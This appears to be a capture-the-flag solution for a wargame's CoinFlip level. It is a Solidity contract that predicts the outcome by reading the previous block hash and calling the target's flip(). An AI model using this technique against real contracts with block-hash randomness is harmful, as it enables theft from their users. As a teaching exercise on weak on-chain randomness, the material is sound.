pragma solidity ^0.6.0;

interface CoinFlip {
  
  function flip(bool _guess) external returns (bool) ;
}

contract EvilContract {
  CoinFlip cf;
  // replace target by your instance address
  uint256 lastHash;
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


  function calc(address target) public returns (bool){
    CoinFlip coinFlipContract = CoinFlip(target);
    uint256 blockValue = uint256(blockhash(block.number-1));


    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
     bool result = coinFlip == 1 ? true : false;
     coinFlipContract.flip(result);
  }


}